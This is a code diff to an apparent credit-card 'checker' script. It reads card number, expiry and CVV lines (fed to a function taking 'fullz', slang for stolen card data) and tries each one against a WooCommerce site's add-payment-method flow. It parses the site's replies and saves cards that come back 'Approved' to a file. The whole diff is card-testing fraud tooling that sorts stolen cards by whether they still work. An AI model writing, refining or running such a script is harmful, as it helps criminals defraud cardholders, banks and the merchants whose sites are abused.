@@ -269,6 +269,8 @@ async def create_payment_method(fullz, session):
 
 async def multi_checking(x):
     cc, mes, ano, cvv = x.split("|")
+
+    # Validate expiry date
     valid, err = validate_expiry_date(mes, ano)
     if not valid:
         print(f"{x} - {err} ❌")
@@ -282,8 +284,9 @@ async def multi_checking(x):
     elapsed = round(time.time() - start, 2)
 
     error_message = ""
-    response = ""
+    response = "Declined ❌"
 
+    # Try to parse JSON response
     try:
         json_resp = json.loads(result)
         if "error" in json_resp and "message" in json_resp["error"]:
@@ -293,8 +296,9 @@ async def multi_checking(x):
             if div:
                 error_message = div.get_text(separator=" ", strip=True)
     except Exception:
+        # Fallback: parse HTML directly
         try:
-            soup = BeautifulSoup(unescape(result), "html.parser")
+            soup = BeautifulSoup(unescape(result or ""), "html.parser")
             ul = soup.find("ul", class_="woocommerce-error")
             if ul:
                 li = ul.find("li")
@@ -307,22 +311,25 @@ async def multi_checking(x):
         except Exception:
             error_message = ""
 
-    if "Reason: " in error_message:
-        before, sep, after = error_message.partition("Reason: ")
+    # Extract reason if available
+    if error_message and "Reason: " in error_message:
+        _, _, after = error_message.partition("Reason: ")
         error_message = after.strip()
 
-    if "Payment method successfully added." in error_message:
+    # Check success message
+    if error_message and "Payment method successfully added." in error_message:
         response = "Approved ✅"
         error_message = ""
-    else:
+    elif "Payment method successfully added." in (result or ""):
         response = "Approved ✅"
 
+    # Print results
     if error_message:
         print(f"{x} - {error_message} ❌ - Taken {elapsed}s")
     else:
         resp = f"{x} - {response} - Taken {elapsed}s"
         print(resp)
-        if "Approved ✅" in response:
+        if response == "Approved ✅":
             with open("auth.txt", "a", encoding="utf-8") as file:
                 file.write(resp + "\n")
 
